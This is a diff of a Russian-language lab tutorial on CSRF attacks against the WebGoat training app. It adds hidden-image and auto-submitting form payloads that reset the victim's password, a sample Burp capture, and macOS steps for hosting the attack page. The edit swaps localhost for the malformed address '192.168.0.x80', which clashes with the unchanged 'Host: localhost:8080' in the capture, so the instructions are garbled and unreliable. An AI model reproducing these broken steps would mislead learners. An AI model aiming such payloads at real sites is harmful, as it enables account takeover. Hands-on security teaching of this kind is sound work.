@@ -45,7 +45,7 @@ Cookie: session=abc123
 ### Настройка WebGoat
 
 1. Убедитесь, что WebGoat запущен: `docker run -d -p 8080:8080 webgoat/goatandwolf`
-2. Откройте http://localhost:8080/WebGoat
+2. Откройте http://192.168.0.x80/WebGoat
 3. Войдите под любым именем (значения не важны)
 
 ### Практика: CSRF в WebGoat
@@ -64,7 +64,7 @@ GET /WebGoat/csrf/basic-get?newPassword=password&confirmPassword=password HTTP/1
 <html>
 <body>
   <h1>Поздравляем! Вы выиграли приз!</h1>
-  <img src="http://localhost:8080/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked" style="display:none">
+  <img src="http://192.168.0.x80/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked" style="display:none">
 </body>
 </html>
 ```
@@ -79,7 +79,7 @@ GET /WebGoat/csrf/basic-get?newPassword=password&confirmPassword=password HTTP/1
 ```html
 <html>
 <body>
-  <form action="http://localhost:8080/WebGoat/csrf/basic-post" method="POST" id="csrf">
+  <form action="http://192.168.0.x80/WebGoat/csrf/basic-post" method="POST" id="csrf">
     <input type="hidden" name="newPassword" value="hacked">
     <input type="hidden" name="confirmPassword" value="hacked">
   </form>
@@ -100,7 +100,86 @@ GET /WebGoat/csrf/basic-get?newPassword=password&confirmPassword=password HTTP/1
 2. **Скриншот 2**: Вредоносная страница открыта в браузере
 3. **Скриншот 3**: Burp Suite — перехваченный CSRF-запрос с cookie
 
+### Примеры вывода
+
+**Вредоносная страница (csrf_attack.html):**
+```html
+<html>
+<body>
+  <h1>Поздравляем! Вы выиграли приз!</h1>
+  <img src="http://192.168.0.x80/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked" 
+       style="display:none">
+</body>
+</html>
+```
+
+**Перехваченный в Burp запрос:**
+```
+GET /WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked HTTP/1.1
+Host: localhost:8080
+Cookie: JSESSIONID=ABC123DEF456
+Referer: file:///Users/user/csrf_attack.html
+
+HTTP/1.1 200 OK
+{"success": true, "passwordChanged": true}
+```
+
+**HTML-форма для POST CSRF:**
+```html
+<form action="http://192.168.0.x80/WebGoat/csrf/basic-post" method="POST" id="csrf">
+  <input type="hidden" name="newPassword" value="hacked">
+  <input type="hidden" name="confirmPassword" value="hacked">
+</form>
+<script>document.getElementById('csrf').submit();</script>
+```
+
+### Частые ошибки
+
+1. **Забыть про cookie** — CSRF работает только если жертва авторизована
+2. **Использовать GET вместо POST** — многие формы принимают только POST
+3. **Неправильный Referer** — некоторые сайты проверяют заголовок Referer
+4. **Открывать вредоносную страницу в инкогнито** — сессия не будет найдена
+
+### Вопросы на понимание
+
+1. Почему CSRF работает даже если сайт использует HTTPS?
+2. Как атрибут `SameSite=Strict` защищает от CSRF?
+3. Почему наличие CSRF-токена делает атаку невозможной?
+4. Можно ли выполнить CSRF через XSS? Как это сделать?
+
+### Адаптация под macOS (M2)
+
+```bash
+# Создание вредоносной страницы на macOS
+cat > /tmp/csrf.html << 'EOF'
+<html>
+<body>
+  <img src="http://192.168.0.x80/WebGoat/csrf/basic-get?newPassword=hacked&confirmPassword=hacked" 
+       style="display:none">
+</body>
+</html>
+EOF
+
+# Открытие в браузере (замените путь к браузеру)
+open -a Firefox /tmp/csrf.html
+
+# Проверка локального веб-сервера для хостинга CSRF-страницы
+python3 -m http.server 8000 &
+# Теперь CSRF-страница доступна по http://192.168.0.123:8000/csrf.html
+```
+
 ---
+
+
+## Адаптация под macOS (M2, 8GB)
+
+- Для установки инструментов используйте Homebrew: `brew install <tool>`
+- На MacBook Air M2 (8GB) запускайте VM с памятью не более 3-4GB
+- Используйте UTM вместо VirtualBox (лучшая поддержка ARM)
+- Docker работает нативно на M2: `docker pull <image>`
+- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
+- Для Python используйте `pip3 install` вместо `pip install`
+
 
 ## Задачи для самостоятельного выполнения
 
